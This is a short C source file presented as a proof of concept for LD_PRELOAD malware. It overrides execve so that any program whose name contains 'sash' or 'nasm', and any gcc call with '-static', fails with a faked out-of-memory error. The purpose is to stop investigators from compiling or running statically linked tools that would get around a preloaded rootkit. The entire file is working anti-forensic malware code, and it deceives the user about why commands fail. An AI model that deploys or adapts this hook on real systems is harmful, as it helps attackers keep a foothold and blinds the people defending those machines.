/*
 *
 *  Very simple PoC to show how you can break static compilation of binaries with gcc in LD_PRELOAD malware.
 *  (and execution of certain statically compiled programs, but this can be bypassed easily)
 *  (no file protection/hiding system is really required for this PoC)
 *
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dlfcn.h>

#include <sys/types.h>
#include <sys/stat.h>

static char *blacklisted_progs[] = {"sash", "nasm", NULL};

int (*old_execve)(const char *filename, char *const argv[], char *const envp[]);

int execve(const char *filename, char *const argv[], char *const envp[])
{
    if(!old_execve) old_execve = dlsym(RTLD_NEXT, "execve");

    int i = 0;

    for(i = 0; blacklisted_progs[i] != NULL; i++)
    {
        if(strstr(argv[0], blacklisted_progs[i]))
        {
            errno = ENOMEM;
            return -1;
        }
    }

    if(strstr(argv[0], "gcc"))
    {
        for(i = 0; argv[i] != NULL; i++)
        {
            if(!strcmp(argv[i], "-static"))
            {
                errno = ENOMEM;
                return -1;
            }
        }
    }

    return old_execve(filename, argv, envp);
}
